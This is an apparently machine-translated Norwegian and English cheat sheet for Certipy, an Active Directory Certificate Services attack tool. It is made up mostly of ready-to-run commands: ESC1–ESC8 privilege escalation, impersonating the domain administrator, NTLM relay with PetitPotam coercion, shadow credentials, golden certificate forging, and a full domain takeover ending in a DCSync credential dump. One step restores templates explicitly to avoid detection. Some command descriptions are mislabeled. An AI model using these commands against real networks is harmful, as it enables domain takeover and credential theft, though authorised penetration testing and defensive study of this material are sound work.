<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🏛️ Certipy - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
  ██║     █████╗  ██████╔╝   ██║   ██║██████╔╝ ╚████╔╝ 
  ██║     ██╔══╝  ██╔══██╗   ██║   ██║██╔═══╝   ╚██╔╝  
  ╚██████╗███████╗██║  ██║   ██║   ██║██║        ██║   
   ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
       Active Directory Certificate Services (AD CS) Abuse
```
<p align="center">
  <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
  <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerabilities-red?style=for-the-badge" alt="ESC1-ESC15">
  <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
  <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
</p>

<p align="center">
  <b>🔑 Omfattende verktøy for oppregning og utnyttelse av Active Directory Certificate Services (AD CS) feilkonfigurasjoner</b>
</p>

---

## 📋 Innholdsfortegnelse

– [Introduksjon](#-introduksjon)
– [Hvorfor AD CS-misbruk?](#-why-ad-cs-abuse)
- [Installasjon](#-installasjon)
- [Certipy Subcommands Overview](#-certipy-subcommands-overview)
- [Enumeration & Discovery (`find`)](#-enumeration--discovery-find)
- [The ESC Vulnerability Matrix](#-the-esc-vulnerability-matrix)
  - [ESC1: Enrollee Supplies Subject Alt Name (SAN)](#esc1-enrollee-supplies-subject-alt-name-san)
  - [ESC2: Any Purpose EKU eller SubCA](#esc2-any-purpose-eku-or-subca)
  - [ESC3: Certificate Request Agent](#esc3-certificate-request-agent)
  - [ESC4: Vulnerable Template Access Control (ACL)](#esc4-vulnerable-template-access-control-acl)
  - [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 aktivert](#esc6-editf_attributesubjectaltname2-enabled)
  - [ESC7: Vulnerable CA Access Control](#esc7-vulnerable-ca-access-control)
  - [ESC8: NTLM Relay to HTTP Web Enrollment](#esc8-ntlm-relay-to-http-web-enrollment)
  - [ESC9 & ESC10: Strong Certificate Mapping Flaws](#esc9--esc10-strong-certificate-mapping-flaws)
- [Shadow Credentials (`shadow`)](#-shadow-legitimasjon-skygge)
- [Golden Certificates (`forge`)](#-golden-certificates-forge)
- [Autentisering med PFX (`auth`)](#-autentisering-med-pfx-auth)
- [Real-World Attack Workflows](#-real-world-attack-arbeidsflyter)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Tips og beste fremgangsmåter](#-tips--beste praksis)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)
- [Ressurser](#-ressurser)

---

## 🎯 Introduksjon

**Certipy** (laget av Oliver Lyak) er det fremste Python-baserte verktøyet for å telle opp og utnytte Active Directory Certificate Services (**AD CS**). AD CS er Microsofts Public Key Infrastructure (PKI)-implementering for Active Directory-nettverk for bedrifter, mye brukt for smartkortpålogging, VPN-er, S/MIME og intern TLS-kryptering.

Fordi feilkonfigurasjoner av sertifikater ofte lar uprivilegerte domenebrukere be om sertifikater som domeneadministratorer eller domenekontrollere, representerer AD CS-misbruk en av de mest pålitelige og mest virkningsfulle domeneeskaleringsvektorene i moderne bedriftspenetrasjonstester.

---

## ⚖️ Hvorfor misbruk av AD CS?

- ⚡ **Øyeblikkelig domeneeskalering:** Feilkonfigurerte sertifikatmaler gir ofte domeneomfattende kompromisser på sekunder.
- 🔑 **Tjekk og vedvarende:** Stjålne sertifikater eller forfalskede gyldne sertifikater kan forbli gyldige i årevis uten å utløse standard varsler om passordendring.
- 🔄 **PKINIT til NT Hash:** Certipy autentiserer forespurte `.pfx`-sertifikater over Kerberos PKINIT, og henter målets NT-hash direkte fra KDC.

---

## 📥 Installasjon

### Bruke pipx (anbefalt)
```bash
pipx install certipy-ad
```
### Fra GitHub Repository
```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```
### Bekreftelse
```bash
certipy -h
```
---

## 🧭 Oversikt over sertifikatunderkommandoer

| Underkommando | Funksjon |
|------------|--------|
| `find` | Oppregne CAer, maler og oppdage ESC-sårbarheter |
| `req` | Be om sertifikater fra sårbare maler |
| `auth` | Autentiser med `.pfx`-sertifikater for å hente TGT- og NT-hash |
| `ca` | Oppregne og endre CA-konfigurasjonsinnstillinger |
| `template` | Endre sertifikatmalinnstillinger (nyttig i ESC4) |
| `account` | Administrer Active Directory-datamaskinkontoer (MachineAccountQuota) |
| `shadow` | Utnytt Shadow Credentials (`msDS-KeyCredentialLink`) |
| `forge` | Forfalske gylne sertifikater ved å bruke en stjålet CA privat nøkkel |

---

## 🔍 Oppregning og oppdagelse (`find`)

Start med å identifisere Enterprise Certificate Authority (CA) og skanne etter sårbare maler:
```bash
# Enumerate all CAs and templates with standard credentials
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1

# Print vulnerable templates directly to terminal
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulnerable -stdout

# Output results formatted for BloodHound
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
```
---

## 💥 ESC-sårbarhetsmatrisen

### ESC1: Enrollee Supplies Subject Alt Name (SAN)

**Tilstand:**
- Lavprivilegerte brukere har registreringsrettigheter (`Client Authentication` EKU aktivert).
- Malen spesifiserer `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (gjør forespørselen mulighet til å spesifisere et hvilket som helst alternativt emnenavn, for eksempel domeneadministratoren).

**Utnyttelse:**
```bash
# 1. Request certificate on behalf of Domain Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# 2. Authenticate with resulting administrator.pfx via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
*Utdata gir administratorens TGT og klartekst NT Hash!*

---

### ESC2: Alle formål EKU eller SubCA

**Tilstand:**
- Malen spesifiserer `Any Purpose` EKU eller har ingen EKU definert.
- Kan brukes til alle formål, inkludert klientautentisering.

**Utnyttelse:**
Utnyttet identisk med ESC1 eller brukt i kombinasjon med ESC3 for å få et registreringsagentsertifikat.

---

### ESC3: Agent for sertifikatforespørsel

**Tilstand:**
- Malen har `Certificate Request Agent` EKU (Enrollment Agent).
- Tillater å be om sertifikater på vegne av en annen bruker på tvers av sekundære maler.

**Utnyttelse:**
```bash
# 1. Request Enrollment Agent certificate
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'AgentTemplate' -dc-ip 10.10.10.1

# 2. Use the agent certificate to request on behalf of Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx john.pfx -dc-ip 10.10.10.1

# 3. Authenticate with the obtained Administrator PFX
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
---

### ESC4: Sårbar maltilgangskontroll (ACL)

**Tilstand:**
- Bruker med lav privilegium har `WriteOwner`-, `WriteDacl`- eller `WriteProperty`-rettigheter over en sertifikatmal.

**Utnyttelse:**
```bash
# 1. Overwrite template configuration to make it vulnerable to ESC1
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.1

# 2. Request certificate as Administrator (ESC1)
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1

# 3. Restore original template configuration to avoid detection
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json -dc-ip 10.10.10.1
```
---

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 aktivert

**Tilstand:**
- CA har `EDITF_ATTRIBUTESUBJECTALTNAME2`-flagget satt, slik at enhver sertifikatforespørsel kan spesifisere vilkårlige SAN-er uavhengig av malinnstillinger!

**Utnyttelse:**
```bash
# Request certificate as Administrator using any template allowing Client Auth (e.g. default 'User')
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1
```
---

### ESC7: Sårbar CA-tilgangskontroll

**Tilstand:**
- Brukeren har `ManageCA`- eller `ManageCertificates`-rettigheter på selve CAen.

**Utnyttelse:**
```bash
# 1. Add yourself as Officer on the CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -add-officer 'john.doe' -dc-ip 10.10.10.1

# 2. Enable vulnerable template on CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA' -dc-ip 10.10.10.1

# 3. Issue and retrieve previously denied request
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
```
---

### ESC8: NTLM-relé til HTTP-nettregistrering

**Tilstand:**
- CA har Web Enrollment HTTP-endepunktet (`/certsrv/`) aktivert med NTLM-autentisering uten EPA (Extended Protection for Authentication) og HTTPS.

**Arbeidsflyt for utnyttelse:**
1. Start `ntlmrelayx` og pek på CA Web Enrollment:
   ```bash
   impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```
2. Utløs tvungen maskinautentisering via PetitPotam eller PrinterBug:
   ```bash
   python3 petitpotam.py 192.168.1.100 10.10.10.1
   ```
3. `ntlmrelayx` videresender DCs maskinkonto NTLM auth, ber om et datasertifikat og sender ut base64 `.pfx`.
4. Autentiser som domenekontroller ved å bruke Certipy:
   ```bash
   certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
   ```
5. Bruk DCs NT-hash for å utføre en full DCSync-dump med `impacket-secretsdump`.

---

## 👥 Shadow Credentials (`shadow`)

Hvis en kompromittert konto har skrivetilgang over en annen kontos `msDS-KeyCredentialLink`-attributt:
```bash
# Automatically write key credential, authenticate via PKINIT, and recover target NT hash
certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
  -account 'TARGET_USER' \
  -dc-ip 10.10.10.1
```
---

## 👑 Gylne sertifikater (`forge`)

Hvis du har kompromittert CA og trukket ut dens private nøkkel:
```bash
# Forge a Golden Certificate valid for any user without contacting the CA
certipy forge -ca-pfx ca_private.pfx \
  -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```
---

## 🔑 Autentisering med PFX (`auth`)
```bash
# Retrieve TGT and NT hash via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Save TGT to ccache for Kerberos ticketing
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```
---

## 🎬 Arbeidsflyter for angrep fra den virkelige verden

### Fullfør ESC1-domeneovertakelse med 3 kommandoer
```bash
# Step 1: Discover ESC1 template
certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Step 2: Request certificate as Administrator
certipy req -u 'alice@domain.local' -p 'Summer2026!' \
  -ca 'Domain-CA' \
  -template 'SmartCardUser' \
  -upn 'administrator@domain.local' \
  -dc-ip 10.10.10.1

# Step 3: Extract NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 4: Full DCSync dump
impacket-secretsdump -hashes :<EXTRACTED_NT_HASH> 'domain.local/administrator@10.10.10.1'
```
---

## 📊 Hurtigreferansetabell

| Oppgave | Kommando |
|------|--------|
| **Oppreg AD CS** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
| **Be om sertifikat (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
| **Autentiser PFX** | `certipy auth -pfx <file>.pfx -dc-ip <IP>` |
| **Endre mal (ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
| **Shadow Credentials** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
| **Administrer CA-rettigheter** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
| **Forge Golden Cert** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |

---

## 💡 Tips og beste fremgangsmåter

1. **Sjekk DC Clock Sync:**
   Kerberos PKINIT krever at systemtiden din synkroniseres innen 5 minutter fra domenekontrolleren. Løp:
   ```bash
   sudo rdate -n 10.10.10.1
   # or
   sudo ntpdate 10.10.10.1
   ```
2. **Håndter KDC_ERR_PADATA_TYPE_NOSUPP:**
   Hvis `certipy auth` mislykkes med denne feilen, har ikke domenekontrolleren et gyldig domenekontrollersertifikat installert for PKINIT. I dette tilfellet, bruk LDAP- eller SChannel-autentisering.
3. **Rydd alltid opp i ESC4-maler:**
   Når du endrer sertifikatmaler, må du alltid beholde og bruke sikkerhetskopikonfigurasjonen (`-configuration <FILE>.json`) på nytt for å unngå å gjøre miljøet sårbart eller forårsake driftsavbrudd.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> **VIKTIG:** Active Directory Certificate Services-angrep gir kritisk administrativ tilgang med høy innvirkning på tvers av domenenettverk. Sertifisering må kun utføres under autoriserte penetrasjonstester, røde teamøvelser og etiske sikkerhetsrevisjoner med skriftlig tillatelse.

---

## 📚 Ressurser

- [Certipy Official GitHub Repository](https://github.com/ly4k/Certipy)
– [Certified Pre-Owned Whitepaper (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [AD CS Attack Paths & Protections (Oliver Lyak)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)